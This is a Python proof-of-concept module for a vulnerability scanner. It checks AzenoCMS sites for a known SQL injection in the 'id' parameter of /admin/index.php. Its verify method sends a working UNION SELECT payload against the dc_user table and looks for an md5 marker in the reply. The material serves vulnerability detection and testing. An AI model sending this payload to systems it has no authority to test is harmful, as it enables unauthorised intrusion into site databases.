# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'AzenoCMS_0000'  # 平台漏洞编号
    name = 'AzenoCMS SQL Injection Vulnerability'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2010-03-13'  # 漏洞公布时间
    desc = '''
        Azeno CMS的/admin/index.php 文件"id" 变量没有进行过滤，造成SQL注入。
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/11711/'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'AzenoCMS'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3531cfbe-3f6f-428a-b4fb-43e13fbc4c76'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/admin/index.php?id=-1 UNION SELECT 1,CONCAT(0x7165696a71,CAST(md5(23333) AS CHAR),0x20),3,4,5,6,7 FROM dc_user"
            verify_url = self.target + payload
            content = requests.get(verify_url).text
            if "qeijq0ba7bc92fcd57e337ebb9e74308c811f" in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name,url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
